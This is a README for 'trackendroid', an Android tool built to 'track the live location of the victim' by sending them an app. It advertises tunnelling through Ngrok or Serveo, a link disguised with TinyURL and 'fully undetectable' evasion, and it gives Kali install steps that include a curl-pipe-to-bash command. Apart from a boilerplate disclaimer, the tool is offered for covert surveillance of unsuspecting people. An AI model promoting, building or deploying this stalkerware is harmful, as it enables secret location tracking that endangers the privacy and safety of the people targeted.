# trackendroid v1.2
A tool to track the live location of the victim by sharing an app.

## Instagram: https://www.instagram.com/programemerz

![](image.png)

### Features:
#### Custom App Name
#### 2 Port Forwarding options (Ngrok or using SSH Tunneling with Serveo.net)
#### Obfuscated URL by Tinyurl
#### FUD (Fully Undetectable)
#### IP tracker

## Legal disclaimer:

Usage of trackendroid for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 

### Auto Install:

```
# bash install.sh
```

### Installing on Kali Linux:
```
Install dependencies:
# apt-get update
# apt-get install default-jdk apksigner

For x86:
# apt-get install libc6-dev-i386 lib32z1

For AMD64:
# apt-get install lib32z1 lib32ncurses6 lib32stdc++6

Download SDK-Tools:
# wget https://dl.google.com/android/repository/sdk-tools-linux-4333796.zip
#mkdir -p $HOME/Android/Sdk
# unzip sdk-tools-linux* -d $HOME/Android/Sdk

Install SDKMAN
# curl -s "https://get.sdkman.io" | bash
# source "$HOME/.sdkman/bin/sdkman-init.sh"
# echo "Y" | sdk install java 8.0.191-oracle
# sdk use java 8.0.191-oracle
# sdk install gradle 2.14.1
# sdk use gradle 2.14.1

# echo "y" | $HOME/Android/Sdk/tools/bin/sdkmanager "platforms;android-25" "build-tools;25.0.1" "extras;google;m2repository" "extras;android;m2repository"

# git clone https://github.com/programemerz/trackendroid
# cd trackendroid
# bash trackendroid.sh
```
